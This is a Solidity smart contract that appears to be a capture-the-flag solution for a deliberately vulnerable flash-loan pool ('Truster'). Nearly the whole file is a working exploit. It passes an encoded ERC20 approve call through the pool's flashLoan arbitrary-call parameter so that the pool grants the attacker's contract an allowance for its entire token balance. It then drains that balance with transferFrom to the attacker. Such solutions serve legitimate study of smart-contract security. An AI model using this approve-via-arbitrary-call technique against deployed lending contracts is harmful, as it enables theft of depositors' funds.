// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";


contract ExploitReceiver {
    using Address for address;

    // Receiver needs to know the pool it is receiving from
    TrusterLenderPool private immutable pool;
    IERC20 private immutable dvt;

    // attacker
    address private immutable owner;

    constructor(address payable dvtAddress, address payable poolAddress) {
        pool = TrusterLenderPool(poolAddress);
        dvt = IERC20(dvtAddress);
        owner = msg.sender;
    }

    // arbitrary function
    //https://swcregistry.io/docs/SWC-104
    function exploit(address attacker) public payable {

        require(attacker == owner);

        // prepare a call for the approve function
        // nospace in parameter stuff for signature
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            // this contract address is related to the attacker/owner
            address(this),
            dvt.balanceOf(address(pool)));

        // interact with the pool, calling the flashLoan will cause
        // the dvtToken approve to be called for our contract address
        pool.flashLoan(0, owner, address(dvt), data);

        // initiate the transfer from pool to attacker address
        dvt.transferFrom(address(pool), attacker, dvt.balanceOf(address(pool)));

    }
}